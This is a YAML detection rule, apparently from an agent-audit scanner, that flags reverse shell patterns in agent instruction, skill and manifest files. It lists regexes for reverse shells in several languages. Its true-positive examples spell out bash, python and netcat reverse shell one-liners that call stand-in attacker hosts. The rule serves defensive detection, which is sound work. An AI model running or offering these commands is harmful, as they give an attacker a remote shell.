external_source:
  tool: aguara
  original_id: SUPPLY_008
  original_title: Reverse shell pattern
  source_version: git-d8797926c0d1
  import_date: '2026-05-03'
  upstream: https://github.com/garagon/aguara
  license: Apache-2.0 (c) 2026 garagon
agent_audit_id: aguara.supply-chain.reverse-shell-pattern
title: Reverse shell pattern
description: Detects common reverse shell patterns across multiple languages
severity_default: critical
category: supply-chain
audit_surface:
- instruction_file
- skill_md
- mcp_manifest
- plugin_manifest
asamm:
  primary: AG-04
  secondary:
  - AD-04
  mapping_confidence: category-default
  notes: Category-level default at import. Review per rule.
match_mode: any
patterns:
- type: regex
  value: (?i)bash\s+-i\s+>\s*&\s*/dev/tcp/
- type: regex
  value: (?i)python[23]?\s+-c\s+["']import\s+socket.*connect
- type: regex
  value: (?i)(nc|ncat|netcat)\s+(-[a-z]*e|-[a-z]*c)\s+.*(sh|bash|cmd)
- type: regex
  value: (?i)perl\s+-e\s+["'].*socket.*exec
- type: regex
  value: (?i)ruby\s+-rsocket\s+-e
- type: regex
  value: (?i)node\s+-e\s+["'].*child_process.*net\.connect
- type: regex
  value: (?i)mkfifo\s+/tmp/[a-z]+.*nc\s+
exclude_patterns: []
remediation: Remove the reverse shell payload immediately. This is almost certainly malicious code.
examples:
  true_positive:
  - bash -i >& /dev/tcp/attacker.com/4444 0>&1
  - python -c 'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444))'
  - nc -e /bin/bash attacker.com 4444
  false_positive:
  - Check for reverse shell patterns in your IDS rules
